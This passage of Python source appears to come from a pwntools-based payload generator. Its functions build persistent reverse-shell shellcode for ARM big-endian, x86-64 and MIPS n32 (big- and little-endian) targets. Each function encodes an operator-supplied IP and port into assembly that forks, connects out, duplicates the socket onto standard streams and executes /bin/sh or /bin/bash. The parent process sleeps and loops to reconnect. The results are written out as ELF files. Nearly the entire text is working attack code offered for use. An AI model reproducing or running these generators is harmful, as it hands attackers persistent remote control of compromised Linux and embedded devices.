	add r5,sp,#-0x2c
	add r8,sp,#-0x20
	main:
	'''

		shellcode += '''
	mov     r7, #2
	svc     0x900002
		'''

		shellcode += '''
	mov r3,r0
	cmp r3,#0
	bne main_lab
	'''


		shellcode += '''
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc 0x900119
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc 0x90011b
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc 0x90003f
	mov r0,r6
	add r1,r1,#1
	svc 0x90003f
	mov r0,r6
	add r1,r1,#1
	svc 0x90003f
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r1}
	push {r0}
	mov r1,sp
	mov r7,#0xb
	svc 0x90000b

	'''
		shellcode += """
	eor     r0, r0, r0
	mov     r7, #1
	svc     0x900000
		"""

		shellcode += '''
main_lab:
	'''

		shellcode += """
mov     r0, r3
eor     r1, r1, r1
eor     r2, r2, r2
eor     r3, r3, r3
mov     r7, #114
svc     0x900072

		"""

		shellcode += """
ldr r10, ={time}
eor r5, r5
push {{r5}}
push {{r10}}
mov r0, sp
mov r7, 0xa2
svc 0x9000a2
	""".format(time=sleep_time)

		shellcode += '''
b _start
nop
	'''

	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(p16(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.bits="32"
	context.arch='arm'
	context.endian='big'
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode='''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	.syntax unified
	.arch armv7-a
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2b]
	strb r4,[sp,#-0x2c]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x61
	strb r7,[sp,#-0x17]
	mov r7,#0x62
	strb r7,[sp,#-0x18]
	mov r7,#0x2f
	strb r7,[sp,#-0x19]
	mov r7,#0x6e
	strb r7,[sp,#-0x1a]
	mov r7,#0x69
	strb r7,[sp,#-0x1b]
	mov r7,#0x62
	strb r7,[sp,#-0x1c]
	mov r7,#0x2f
	strb r7,[sp,#-0x1d]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r4,sp,#-0x1d
	add r8,sp,#-0x20
	add r5,sp,#-0x2c
	main:
	'''

		shellcode += """
	mov     r7, #2
	svc     0x900002

		"""

		shellcode += '''
	mov r3,r0
	cmp r3,#0
	bne main_lab
	'''

		shellcode += '''
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc 0x900119
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc 0x90011b
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc 0x90003f
	mov r0,r6
	add r1,r1,#1
	svc 0x90003f
	mov r0,r6
	add r1,r1,#1
	svc 0x90003f
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc 0x90000b
	'''
		shellcode += """
	eor     r0, r0, r0
	mov     r7, #1
	svc     0x900000
		"""

		shellcode += '''
main_lab:
	'''

		shellcode += """
	mov     r0, r3
	eor     r1, r1, r1
	eor     r2, r2, r2
	eor     r3, r3, r3
	mov     r7, #114
	svc     0x900072

		"""

		shellcode += """
ldr r10, ={time}
eor r5, r5
push {{r5}}
push {{r10}}
mov r0, sp
mov r7, 0xa2
svc 0x9000a2
pop {{r5,r10}}
	""".format(time=sleep_time)

		shellcode += '''
b _start
nop
	'''

	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode = '''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	.syntax unified
	.arch armv7-a
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2b]
	strb r4,[sp,#-0x2c]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r8,sp,#-0x20
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	main:
	'''

		shellcode += """
	mov     r7, #2
	svc     0x900002

		"""

		shellcode += '''
	mov r3,r0
	cmp r3,#0
	bne main_lab
	'''


		shellcode += '''
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc 0x900119
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc 0x90011b
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc 0x90003f
	mov r0,r6
	add r1,r1,#1
	svc 0x90003f
	mov r0,r6
	add r1,r1,#1
	svc 0x90003f
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r1}
	push {r0}
	mov r1,sp
	mov r7,#0xb
	svc 0x90000b
	'''

		shellcode += shellcraft.exit(0)

		shellcode += '''
main_lab:
	'''

		shellcode += """
	mov     r0, r3
	eor     r1, r1, r1
	eor     r2, r2, r2
	eor     r3, r3, r3
	mov     r7, #114
	svc     0x900072

		"""

		shellcode += """
ldr r10, ={time}
eor r5, r5
push {{r5}}
push {{r10}}
mov r0, sp
mov r7, 0xa2
svc 0x9000a2
pop {{r5,r10}}
	""".format(time=sleep_time)

		shellcode += '''
b _start
nop
	'''

	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(p16(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[1],handle_port[0])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def x64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.arch = 'amd64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		#shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode ='''
.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.intel_syntax noprefix
_start:
	'''
	shellcode += shellcraft.fork()
	shellcode += '''
	cmp   rax,0
	jnz   main_lab
	'''
	shellcode += shellcraft.connect(reverse_ip, reverse_port)
	shellcode += shellcraft.dup2("rbp",0)+shellcraft.dup2("rbp",1)+shellcraft.dup2("rbp",2)
	shellcode += shellcraft.execve(shell_path,shell_path_list, envp )
	shellcode += shellcraft.exit(0)
	shellcode += '''
main_lab:
	push 61
	pop rax
	xor rdi,rdi
	syscall
	push 0x0
	push {time}
	mov  rdi, rsp
	mov rax, 35
	syscall
	jmp _start
	'''.format(time=sleep_time)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

'''
add 2023.2.28
fork 0x0017a7
wait4 0x0017ab
exit 0x00183d
sleep 0x00001792
'''


def mipsn32_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
	context.architectures['mipsn32'] = {'endian': 'big', 'bits': 32}
	context.arch = 'mipsn32'
	context.endian = "big"
	context.bits = "32"
	if(my_package.get_mipsn32_binutils(context.arch) == 1):
		return 
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port = int(hex(reverse_port), 16)
	reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
	reverse_ip = list(reverse_ip.split("."))
	reverse_ip_high = hex(0x10000 - ((int(reverse_ip[0]) << 8) + int(reverse_ip[1])) - 1)
	# print(reverse_ip_high)
	# print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	# print(reverse_ip_high)
	reverse_ip_low = hex(0x10000 - ((int(reverse_ip[2]) << 8) + int(reverse_ip[3])) - 1)
	shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	"""
	shellcode += """
li      $a0, 0x1200012
li      $a1, 0
li      $a2, 0
li      $a3, 0
li      $v0, 0x17a7
syscall 0x40404
	"""

	shellcode += '''
move  $s5, $v0
bnez $v0, main_lab
nop
	'''

# connect

	shellcode_connect = """
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x1798
syscall 0x40404
sw      $v0, -4($sp)
lw      $s0, -4($sp)
lui     $t9, 0xfffd
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, %s
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu  $sp, $sp, -8
sw      $s0, -4($sp)
lw      $a0, -4($sp)
move     $a1,$sp
li      $t9, -17
nor     $a2, $t9, $zero
li      $v0, 0x1799
syscall 0x40404
	"""
	shellcode_connect = shellcode_connect%(reverse_port,reverse_ip_high,reverse_ip_low)
	shellcode += shellcode_connect

# dump_sh
	shellcode += '''
move $a0,$s0
nor $a1,$zero,-1
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
	'''

	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -8($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -5
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
		"""

	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -8($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -16($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -12($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xd296
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
		"""

	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)


#exit
	shellcode += """
slti    $a0, $zero, -1
li      $v0, 0x00183d
syscall 0x40404
	"""

	shellcode += '''
main_lab:
	'''
#wait4
	shellcode += """
add     $a0, $s5, $zero
slti    $a1, $zero, -1
slti    $a2, $zero, -1
slti    $a3, $zero, -1
li      $v0, 0x0017ab
syscall 0x40404
	"""

	shellcode += """
xor  $t0,$t0,$t0
addiu $sp, $sp, -4
sw   $t0, 0($sp)
li   $t0,{time}
addiu $sp, $sp, -4
sw   $t0, 0($sp)
move $a0,$sp
li   $v0, 0x1792
syscall 0x40404
	""".format(time=sleep_time)

	shellcode += '''
j __start
nop
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_add_arch_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_add_arch_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_add_arch_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 
			

def mipsn32el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time ,filename=None):
	context.architectures['mipsn32el'] = {'endian': 'little', 'bits': 32}
	context.arch = 'mipsn32el'
	context.endian = "little"
	context.bits = "32"
	if(my_package.get_mipsn32_binutils(context.arch) == 1):
		return 
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port=int(hex(reverse_port),16)
	reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
	reverse_ip=list(reverse_ip.split("."))
	reverse_ip_high=hex(0x10000-((int(reverse_ip[1])<<8)+int(reverse_ip[0]))-1)
	#print(reverse_ip_high)
	#print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	#print(reverse_ip_high)
	reverse_ip_low=hex(0x10000-((int(reverse_ip[3])<<8)+int(reverse_ip[2]))-1)
	shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	"""
	shellcode += """
li      $a0, 0x1200012
li      $a1, 0
li      $a2, 0
li      $a3, 0
li      $v0, 0x17a7
syscall 0x40404
	"""

	shellcode += '''
move  $s5, $v0
bnez $v0, main_lab
nop
	'''
	shellcode_connect='''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x1798
syscall 0x40404
sw      $v0, -4($sp)
lw      $s0, -4($sp)
lui     $t9, %s
ori     $t9, $t9, 0xfffd
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, %s
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu  $sp, $sp, -8
sw      $s0, -4($sp)
lw      $a0, -4($sp)
move     $a1,$sp
li      $t9, -17
nor     $a2, $t9, $zero
li      $v0, 0x1799
syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)

	shellcode += shellcode_connect

	shellcode += '''
move $a0,$s0
nor $a1,$zero,-1
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
	'''
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode += """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -5
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
		"""

	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t1, 0x7361
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
li      $t9, -105
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -16($sp)
lui     $t1, 0x7361
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0x96d2
ori     $t9, $t9, 0xff97
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404

		"""

	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)


#exit
	shellcode += """
slti    $a0, $zero, -1
li      $v0, 0x00183d
syscall 0x40404
	"""

	shellcode += '''
main_lab:
	'''
#wait4
	shellcode += """
add     $a0, $s5, $zero
slti    $a1, $zero, -1
slti    $a2, $zero, -1
slti    $a3, $zero, -1
li      $v0, 0x0017ab
syscall 0x40404
	"""

	shellcode += """
xor  $t0,$t0,$t0
addiu $sp, $sp, -4
sw   $t0, 0($sp)
li   $t0,{time}
addiu $sp, $sp, -4
sw   $t0, 0($sp)
move $a0,$sp
li   $v0, 0x1792
syscall 0x40404
	""".format(time=sleep_time)

	shellcode += '''
j __start
nop
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
		my_package.my_make_add_arch_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_add_arch_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_add_arch_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 